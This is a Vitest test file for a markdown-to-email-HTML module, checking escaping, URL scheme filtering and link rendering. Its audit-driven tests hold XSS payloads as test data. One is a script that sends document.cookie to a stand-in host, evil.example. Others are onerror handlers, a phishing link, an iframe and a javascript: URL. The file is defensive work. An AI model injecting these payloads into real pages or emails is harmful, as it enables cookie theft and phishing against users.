import { describe, expect, it } from "vitest";
import { escapeHtmlText, markdownToHtml, safeAttrUrl, stripMarkdownLinks } from "./html";

describe("stripMarkdownLinks", () => {
  it("keeps link labels and image alt text", () => {
    expect(stripMarkdownLinks("see [docs](https://example.com/x)")).toBe("see docs");
    expect(stripMarkdownLinks("![Scan me](https://example.com/qr.png)")).toBe("Scan me");
    expect(stripMarkdownLinks("![](cid:feedback-qr)")).toBe("QR code");
  });
});

describe("markdownToHtml image alt (audit run-5)", () => {
  it("escapes quotes so the alt cannot break out of its attribute", () => {
    const html = markdownToHtml('![x" onerror="alert(1)](https://a.example/q.png)');
    expect(html).not.toMatch(/"\s*onerror=/);
    expect(html).toContain('alt="x&quot; onerror=&quot;alert(1)"');
  });
});

describe("escapeHtmlText", () => {
  it("escapes ampersands and angle brackets", () => {
    expect(escapeHtmlText("a & b < c > d")).toBe("a &amp; b &lt; c &gt; d");
  });
});

describe("safeAttrUrl", () => {
  it("allows http(s) and rejects other schemes", () => {
    expect(safeAttrUrl("https://example.com/a?b=1&c=2")).toBe("https://example.com/a?b=1&amp;c=2");
    expect(safeAttrUrl("javascript:alert(1)")).toBe("");
    expect(safeAttrUrl("cid:x")).toBe("");
    expect(safeAttrUrl("cid:x", true)).toBe("cid:x");
  });
});

describe("markdownToHtml", () => {
  it("wraps output and renders headings, bold and links", () => {
    const html = markdownToHtml("## Title\n\n**bold** and [link](https://example.com)");
    expect(html.startsWith("<div")).toBe(true);
    expect(html).toContain("<h2");
    expect(html).toContain("font-weight:600");
    expect(html).toContain('<a href="https://example.com">link</a>');
  });

  it("renders a link fully wrapped in bold (resource-list style: **[label](url)**)", () => {
    // Every generated resource line looks like `➡️ **[label](url)**` (see
    // buildTrainingMaterialsBlock and friends in mail-engine/links.ts). Bold
    // must not swallow the link markdown as literal text.
    const html = markdownToHtml("➡️ **[Introductory Training](https://docs.google.com/presentation/d/abc/edit)**");
    expect(html).toContain(
      '<span style="font-weight:600;color:#222;"><a href="https://docs.google.com/presentation/d/abc/edit">Introductory Training</a></span>',
    );
    expect(html).not.toContain("[Introductory Training]");
  });

  it("collapses duplicate horizontal rules", () => {
    const html = markdownToHtml("a\n\n---\n\n---\n\nb");
    expect(html.match(/border-top:2px solid #ddd/g)?.length).toBe(1);
  });

  // Security audit run-3, F5. The old implementation escaped everything *except*
  // substrings matching `<[^>]+>`, which it could not distinguish from tags it
  // had generated itself — so raw markup in the source prose reached the
  // outgoing email verbatim. Prose is never allowed to carry markup.
  describe("does not pass raw HTML from the source through (F5)", () => {
    const payloads = [
      '<script>fetch("https://evil.example?c="+document.cookie)</script>',
      "Hello <img src=x onerror=alert(1)> world",
      'Click <a href="https://evil.example/phish">your invoice</a> now',
      "<style>*{display:none}</style>hidden",
      "<iframe src=https://evil.example></iframe>",
    ];

    for (const payload of payloads) {
      it(`escapes ${payload.slice(0, 32)}`, () => {
        const html = markdownToHtml(payload);
        // The only tags in the output are the ones this module emits.
        expect(html).not.toContain("<script");
        expect(html).not.toContain("<style");
        expect(html).not.toContain("<iframe");
        expect(html).not.toContain("<img src=x");
        expect(html).not.toContain('<a href="https://evil.example/phish"');
        expect(html).toContain("&lt;");
      });
    }

    it("still renders legitimate markdown, escaped exactly once", () => {
      const html = markdownToHtml("see [docs](https://example.com/a?b=1&c=2) and **bold**");
      expect(html).toContain('<a href="https://example.com/a?b=1&amp;c=2">docs</a>');
      expect(html).not.toContain("&amp;amp;");
      expect(html).toContain("font-weight:600");
    });

    it("escapes bare ampersands and angle brackets in prose", () => {
      const html = markdownToHtml("Tom & Jerry < 5 > 3");
      expect(html).toContain("Tom &amp; Jerry &lt; 5 &gt; 3");
    });

    it("cannot be tricked by a forged placeholder sentinel", () => {
      // U+E000 is the internal token delimiter; source text carrying it must not
      // be able to address a generated-HTML slot.
      const html = markdownToHtml("\uE000" + "0" + "\uE000" + " and [ok](https://example.com)");
      expect(html).toContain('<a href="https://example.com">ok</a>');
      expect(html).not.toContain("\uE000");
    });
  });
});
